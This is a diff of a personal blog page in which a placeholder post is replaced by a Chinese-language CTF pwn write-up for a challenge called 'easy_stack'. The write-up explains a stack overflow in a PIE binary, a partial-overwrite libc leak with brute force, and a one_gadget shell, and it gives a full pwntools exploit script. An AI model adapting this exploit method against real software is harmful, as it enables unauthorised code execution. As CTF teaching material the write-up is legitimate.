@@ -79,18 +79,24 @@
 
 
 
-<meta name="description" content="test">
+<meta name="description" content="xm">
 <meta property="og:type" content="article">
-<meta property="og:title" content="text">
-<meta property="og:url" content="https://caiii-vegtable.github.io/2020/07/19/text/index.html">
+<meta property="og:title" content="xm">
+<meta property="og:url" content="https://caiii-vegtable.github.io/2020/09/28/xm/index.html">
 <meta property="og:site_name" content="inHaus&#39;blog">
-<meta property="og:description" content="test">
-<meta property="og:image" content="https://caiii-vegtable.github.io/image/text/1.png">
-<meta property="article:published_time" content="2020-07-19T01:33:38.000Z">
-<meta property="article:modified_time" content="2020-07-19T01:50:54.255Z">
+<meta property="og:description" content="xm">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xm/main1.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xm/pie-1601278416251.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xm/ret.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xm/main.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xm/gadget.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xm/one.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xm/cat.png">
+<meta property="article:published_time" content="2020-09-28T07:27:49.000Z">
+<meta property="article:modified_time" content="2020-09-28T07:52:12.702Z">
 <meta property="article:author" content="caiii-vegtable">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://caiii-vegtable.github.io/image/text/1.png">
+<meta name="twitter:image" content="https://caiii-vegtable.github.io/image/xm/main1.png">
 
 
 
@@ -120,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="https://caiii-vegtable.github.io/2020/07/19/text/"/>
+  <link rel="canonical" href="https://caiii-vegtable.github.io/2020/09/28/xm/"/>
 
 
 
 
 
-  <title>text | inHaus'blog</title>
+  <title>xm | inHaus'blog</title>
   
 
 
@@ -233,7 +239,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://caiii-vegtable.github.io/2020/07/19/text/">
+    <link itemprop="mainEntityOfPage" href="https://caiii-vegtable.github.io/2020/09/28/xm/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="caiii-vegtable">
@@ -250,7 +256,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">text</h1>
+          <h1 class="post-title" itemprop="name headline">xm</h1>
         
 
         <div class="post-meta">
@@ -262,8 +268,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-07-19T09:33:38+08:00">
-                2020-07-19
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-09-28T15:27:49+08:00">
+                2020-09-28
               </time>
             
 
@@ -300,7 +306,33 @@
       
 
       
-        <h1 id="test"><a href="#test" class="headerlink" title="test"></a>test</h1><p><img src="/image/text/1.png" alt="1"></p>
+        <h1 id="xm"><a href="#xm" class="headerlink" title="xm"></a>xm</h1><a id="more"></a>
+
+<h2 id="1-easy-stack"><a href="#1-easy-stack" class="headerlink" title="#1 easy_stack"></a>#1 easy_stack</h2><p>参考：<a href="http://www.pwn4fun.com/pwn/bypass-pie-2ways.html" target="_blank" rel="noopener">http://www.pwn4fun.com/pwn/bypass-pie-2ways.html</a></p>
+<p>main函数</p>
+<p><img src="/image/xm/main1.png" alt="main1"></p>
+<p>read_n函数</p>
+<p>可以看到栈溢出，关键在于开启了pie，如何返回到main函数。</p>
+<p>checksec</p>
+<p><img src="/image/xm/pie-1601278416251.png" alt="pie"></p>
+<p>gdb调试，在main函数的ret处下断点。</p>
+<p><img src="/image/xm/ret.png" alt="ret"></p>
+<p>可以看到偏移32的地方有个指令，push rbp。</p>
+<p>对比mian函数，发现就是main函数的开始</p>
+<p><img src="/image/xm/main.png" alt="main"></p>
+<p>于是就可以利用三次pop加ret的gadget返回到main函数。（这里需要找libc的gadget）</p>
+<p>同时puts函数会泄露这个gadgetd地址，减去偏移获得libc基址。</p>
+<p><img src="/image/xm/gadget.png" alt="gadget"></p>
+<p>然而，我们只知道后3个字节，还有两个字节不确定，需要爆破。当爆破成功时返回正确的libc。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2main</span><span class="params">()</span>:</span></span><br><span class="line">    pppr=<span class="number">0x0000000000021351</span></span><br><span class="line">    payload=<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'\x51'</span>+<span class="string">'\x13'</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    libc_base=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-pppr</span><br><span class="line">    <span class="keyword">print</span> hex(libc_base)</span><br><span class="line">    <span class="keyword">return</span> libc_base</span><br></pre></td></tr></table></figure>
+
+<p>之后是rop。有/x00截断，不能使用/bin/sh。采用onegadget。</p>
+<p><img src="/image/xm/one.png" alt="one"></p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p=process(<span class="string">'./easy_stack'</span>,env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc-2.27.so"</span>&#125;)</span><br><span class="line"><span class="comment">#p=remote('nc.eonew.cn',10004)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2main</span><span class="params">()</span>:</span></span><br><span class="line">    pppr=<span class="number">0x0000000000021351</span></span><br><span class="line">    payload=<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'\x51'</span>+<span class="string">'\x13'</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    libc_base=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-pppr</span><br><span class="line">    <span class="keyword">print</span> hex(libc_base)</span><br><span class="line">    <span class="keyword">return</span> libc_base</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="comment">#p=remote('nc.eonew.cn',10004)</span></span><br><span class="line">    p=process(<span class="string">'./easy_stack'</span>,env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc-2.27.so"</span>&#125;)</span><br><span class="line">    libc=ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">    elf=ELF(<span class="string">'./easy_stack'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">    	libc_base=ret2main()</span><br><span class="line">    	one=libc_base+<span class="number">0x4f322</span></span><br><span class="line">    	<span class="keyword">print</span> hex(one)</span><br><span class="line">    	sleep(<span class="number">0.3</span>)</span><br><span class="line">    	payload=<span class="string">'a'</span>*<span class="number">0x88</span>+p64(one)</span><br><span class="line">    	p.sendline(payload)</span><br><span class="line">    	sleep(<span class="number">0.3</span>)</span><br><span class="line">    	p.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line">    	p.interactive()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">    	p.close()</span><br></pre></td></tr></table></figure>
+
+<p>效果</p>
+<p><img src="/image/xm/cat.png" alt="cat"></p>
 
       
     </div>
@@ -325,8 +357,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/07/19/hello-world/" rel="next" title="Hello World">
-                <i class="fa fa-chevron-left"></i> Hello World
+              <a href="/2020/09/07/buu2/" rel="next" title="buu2">
+                <i class="fa fa-chevron-left"></i> buu2
               </a>
             
           </div>
@@ -334,10 +366,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/07/20/buu/" rel="prev" title="buu">
-                buu <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -455,7 +483,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#test"><span class="nav-text">test</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#xm"><span class="nav-text">xm</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-easy-stack"><span class="nav-text">#1 easy_stack</span></a></li></ol></li></ol></div>
             
 
           </div>
